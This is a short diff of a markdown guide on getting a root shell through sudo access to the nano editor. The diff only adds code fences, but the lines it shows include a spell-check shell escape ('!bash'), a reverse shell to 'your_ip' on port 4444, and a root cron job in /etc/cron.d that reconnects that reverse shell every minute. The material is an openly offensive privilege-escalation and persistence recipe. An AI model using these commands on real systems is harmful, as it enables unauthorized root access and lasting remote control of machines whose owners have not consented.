@@ -117,6 +117,7 @@ sudo /tmp/compile.sh
 
 ## Method 5: Through Nano's Spell Check Feature
 
+```
 bash
 
 # Some nano versions allow command execution via spell check
@@ -126,9 +127,11 @@ sudo nano /some/file
 # !bash
 # or
 # !sh
+```
 
 ## Method 6: Using Nano's Backup Feature
 
+```
 bash
 
 # Create a script that gives root shell
@@ -141,6 +144,7 @@ bash -i >& /dev/tcp/your_ip/4444 0>&1
 sudo nano /etc/cron.d/rootme
 
 # Add: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/your_ip/4444 0>&1'
+```
 
 ## Method 7: Direct Shell Escape (If Supported)
 
